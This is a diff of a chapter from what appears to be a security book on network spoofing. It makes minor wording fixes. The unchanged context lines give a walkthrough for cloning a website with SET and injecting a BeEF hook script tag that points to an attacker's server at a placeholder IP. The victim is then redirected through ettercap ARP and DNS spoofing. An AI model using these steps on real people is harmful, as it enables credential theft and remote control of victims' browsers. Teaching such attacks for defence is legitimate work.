@@ -77,6 +77,8 @@ The referrer (spelled `referer`) field in HTTP requests can be intercepted and m
 
 ![](images/HandsOnHack.png)
 
+_Todo_
+
 {#network-identify-risks-spoofing-email-address}
 #### E-Mail Address
 ![](images/ThreatTags/easy-widespread-average-moderate.png)
@@ -112,9 +114,9 @@ You can find the video of how it is played out [here](https://www.youtube.com/wa
 I> ## Synopsis
 I>
 I> The average victim will see a valid URL and the spoof will be undetectable.  
-I> Use website that you know victim is likely to spend some time at. This can make it easier if you're running exploits manually in BeEF.  
+I> Use a website that you know victim is likely to spend some time at. This can make it easier if you're running exploits manually in BeEF.  
 I> Can be used to obtain credentials or simply hook with BeEF and run any number of exploits.  
-I> SET would be run on the website you want to clone. As SET only gets the index file, you'll have to use the likes of wget to get any other missing resources you need to complete the website. Static sites are obviously the easiest. We don't really want to have to create a back-end for the cloned website. You may have to update some of the link's to external resources as well in the index.html file that SET creates.  
+I> SET would be run on the website you want to clone. As SET only gets the index file, you'll have to use the likes of `wget` to get any other missing resources you need to complete the website. Static sites are obviously the easiest. We don't really want to have to create a back-end for the cloned website. You may have to update some of the link's to external resources as well in the index.html file that SET creates.  
 I> Ideally you'll have cleaned out the public web directory that apache hosts from `/var/www/`. If you don't, I think SET archives everything in there.
 
 {icon=bomb}
@@ -135,7 +137,7 @@ G> Enter the URL to clone.
 G>
 G> `y` to start apache.
 G>
-G> Here you'll need to either wget any files your missing if you are missing some, or if there are only a small number, just grab them out of your browser developer tools.
+G> Here you'll need to either `wget` any files your missing if you are missing some, or if there are only a small number, just grab them out of your browser developer tools.
 G>
 G> Add the BeEF hook (`<script src="http://<BeEF comms server IP address>:3000/hook.js"></script>`) into the index.html in `/var/www/` usually at the end of the body, just before the `</body>` tag.
 G>
@@ -147,7 +149,7 @@ G> Now run ettercap which is going to both ARP and DNS spoof your victim and the
 G>
 G> You can now log into the BeEF web UI.
 G>
-G> Now when the victim visits your cloned web site, the URL will look legitimate and they'll have no idea that their browser is a BeEF zombie continually asking it's master (the BeEF comms server) what to execute next.
+G> Now when the victim visits your cloned web site, the URL will look legitimate and they'll have no idea that their browser is a BeEF zombie continually asking it's master (the BeEF communications server) what to execute next.
 
 T> ## BeEF Can Also Clone
 T>
